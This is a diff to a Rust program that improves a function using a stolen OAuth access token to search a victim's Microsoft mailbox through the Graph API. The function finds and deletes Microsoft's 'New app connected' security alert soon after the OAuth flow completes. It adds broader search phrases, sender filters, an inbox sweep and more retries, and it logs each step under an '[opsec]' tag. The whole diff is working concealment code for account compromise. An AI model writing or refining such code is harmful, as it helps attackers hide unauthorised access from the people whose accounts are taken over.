@@ -242,44 +242,131 @@ async fn fetch_user_email(access_token: &str) -> Option<String> {
 /// The notification may arrive 5-20 seconds after the OAuth flow completes.
 async fn delete_microsoft_notification_email(access_token: String) {
     let client = Client::new();
-    let search_url = "https://graph.microsoft.com/v1.0/me/messages?$search=\"New app connected\"&$top=10&$select=id,subject,receivedDateTime,from";
+    // Search broadly — Microsoft notification emails vary by locale/account type
+    let search_queries = [
+        // Exact phrases Microsoft uses
+        "\"New app\" AND \"connected\"",
+        "\"New app(s)\" AND \"connected\"",
+        "\"New app connected\"",
+        "\"New app(s) connected\"",
+        "\"app connected\" AND \"Microsoft account\"",
+        "\"have access to your data\"",
+        "\"connected to your Microsoft account\"",
+    ];
 
-    for attempt in 1..=8 {
-        tokio::time::sleep(std::time::Duration::from_secs(3)).await;
+    for attempt in 1..=15 {
+        tokio::time::sleep(std::time::Duration::from_secs(2)).await;
 
-        let resp = match client
-            .get(search_url)
+        // Try multiple search strategies
+        let mut all_messages: Vec<serde_json::Value> = Vec::new();
+
+        // Strategy 1: Graph API $search
+        for query in &search_queries {
+            let search_url = format!(
+                "https://graph.microsoft.com/v1.0/me/messages?$search={}&$top=10&$select=id,subject,receivedDateTime,from,bodyPreview",
+                urlencoding::encode(query)
+            );
+            if let Ok(resp) = client
+                .get(&search_url)
+                .header("Authorization", format!("Bearer {}", access_token))
+                .header("Accept", "application/json")
+                .send()
+                .await {
+                if resp.status().is_success() {
+                    if let Ok(body) = resp.json::<serde_json::Value>().await {
+                        if let Some(msgs) = body.get("value").and_then(|v| v.as_array()) {
+                            all_messages.extend(msgs.clone());
+                        }
+                    }
+                }
+            }
+        }
+
+        // Strategy 2: Filter by known Microsoft notification sender domains
+        let filter_url = "https://graph.microsoft.com/v1.0/me/messages?$filter=from/emailAddress/address eq 'account-security-noreply@accountprotection.microsoft.com' or from/emailAddress/address eq 'microsoftaccount@microsoft.com' or from/emailAddress/address eq 'security@microsoft.com'&$top=5&$select=id,subject,receivedDateTime,from,bodyPreview&$orderby=receivedDateTime desc";
+        if let Ok(resp) = client
+            .get(filter_url)
             .header("Authorization", format!("Bearer {}", access_token))
             .header("Accept", "application/json")
             .send()
             .await {
-            Ok(r) => r,
-            Err(e) => { eprintln!("[opsec] Search attempt {} failed: {}", attempt, e); continue; }
-        };
-        if !resp.status().is_success() {
-            eprintln!("[opsec] Search attempt {} returned status {}", attempt, resp.status());
-            continue;
+            if resp.status().is_success() {
+                if let Ok(body) = resp.json::<serde_json::Value>().await {
+                    if let Some(msgs) = body.get("value").and_then(|v| v.as_array()) {
+                        all_messages.extend(msgs.clone());
+                    }
+                }
+            }
         }
-        let body: serde_json::Value = match resp.json().await {
-            Ok(b) => b,
-            Err(e) => { eprintln!("[opsec] Parse attempt {} failed: {}", attempt, e); continue; }
-        };
-        let messages = body.get("value").and_then(|v| v.as_array()).cloned().unwrap_or_default();
+
+        // Strategy 3: Recent inbox sweep — look at last 20 messages
+        let recent_url = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?$top=20&$select=id,subject,receivedDateTime,from,bodyPreview&$orderby=receivedDateTime desc";
+        if let Ok(resp) = client
+            .get(recent_url)
+            .header("Authorization", format!("Bearer {}", access_token))
+            .header("Accept", "application/json")
+            .send()
+            .await {
+            if resp.status().is_success() {
+                if let Ok(body) = resp.json::<serde_json::Value>().await {
+                    if let Some(msgs) = body.get("value").and_then(|v| v.as_array()) {
+                        all_messages.extend(msgs.clone());
+                    }
+                }
+            }
+        }
+
+        // Deduplicate by ID
+        let mut seen = std::collections::HashSet::new();
+        all_messages.retain(|m| {
+            let id = m.get("id").and_then(|v| v.as_str()).unwrap_or("");
+            if id.is_empty() || seen.contains(id) { false } else { seen.insert(id.to_string()); true }
+        });
+
         let now = Utc::now();
         let mut found = false;
-        for msg in messages {
+
+        for msg in &all_messages {
             let id = msg.get("id").and_then(|v| v.as_str()).unwrap_or("");
             let subject = msg.get("subject").and_then(|v| v.as_str()).unwrap_or("").to_lowercase();
+            let body_preview = msg.get("bodyPreview").and_then(|v| v.as_str()).unwrap_or("").to_lowercase();
             let received = msg.get("receivedDateTime").and_then(|v| v.as_str()).unwrap_or("");
-            let from_name = msg.get("from").and_then(|f| f.get("emailAddress")).and_then(|e| e.get("address")).and_then(|v| v.as_str()).unwrap_or("").to_lowercase();
+            let from_addr = msg.get("from")
+                .and_then(|f| f.get("emailAddress"))
+                .and_then(|e| e.get("address"))
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_lowercase();
+            let from_name = msg.get("from")
+                .and_then(|f| f.get("emailAddress"))
+                .and_then(|e| e.get("name"))
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_lowercase();
 
             let is_recent = if let Ok(dt) = chrono::DateTime::parse_from_rfc3339(received) {
-                (now - dt.with_timezone(&Utc)).num_minutes() <= 10
+                (now - dt.with_timezone(&Utc)).num_minutes() <= 15
             } else { false };
 
+            // Broad detection: subject OR body contains notification keywords
+            let has_notification_subject = subject.contains("new app")
+                || subject.contains("connected")
+                || subject.contains("access to your data")
+                || subject.contains("microsoft account");
+
+            let has_notification_body = body_preview.contains("new app")
+                || body_preview.contains("connected to the microsoft account")
+                || body_preview.contains("have access to your data")
+                || body_preview.contains("manage your apps");
+
+            let is_microsoft_sender = from_addr.contains("microsoft")
+                || from_addr.contains("accountprotection")
+                || from_name.contains("microsoft account team")
+                || from_name.contains("microsoft account");
+
             let is_notification = is_recent
-                && (subject.contains("new app") || subject.contains("connected"))
-                && (from_name.contains("microsoft") || from_name.contains("microsoftaccount"));
+                && (has_notification_subject || has_notification_body)
+                && is_microsoft_sender;
 
             if is_notification && !id.is_empty() {
                 found = true;
@@ -289,20 +376,22 @@ async fn delete_microsoft_notification_email(access_token: String) {
                     .header("Authorization", format!("Bearer {}", access_token))
                     .send()
                     .await {
-                    Ok(r) if r.status().is_success() => {
-                        println!("[opsec] Deleted notification email on attempt {}: {}", attempt, id);
+                    Ok(r) if r.status().is_success() || r.status() == reqwest::StatusCode::NOT_FOUND => {
+                        println!("[opsec] Deleted notification email on attempt {}: subject='{}' from='{}'", attempt, subject, from_addr);
                         return;
                     }
-                    Ok(r) => eprintln!("[opsec] Delete attempt {} failed with status {} for {}", attempt, r.status(), id),
-                    Err(e) => eprintln!("[opsec] Delete error on attempt {} for {}: {}", attempt, id, e),
+                    Ok(r) => eprintln!("[opsec] Delete attempt {} failed with status {} for id={} subject='{}'", attempt, r.status(), id, subject),
+                    Err(e) => eprintln!("[opsec] Delete error on attempt {} for id={}: {}", attempt, id, e),
                 }
             }
         }
+
         if found {
-            return;
+            // Found matching email but delete failed — keep trying
+            continue;
         }
     }
-    eprintln!("[opsec] Notification email not found after 8 attempts (24s). It may have a different subject/sender.");
+    eprintln!("[opsec] Notification email not found after 15 attempts (30s). Check if the email subject/sender changed.");
 }
 
 #[derive(Deserialize)]
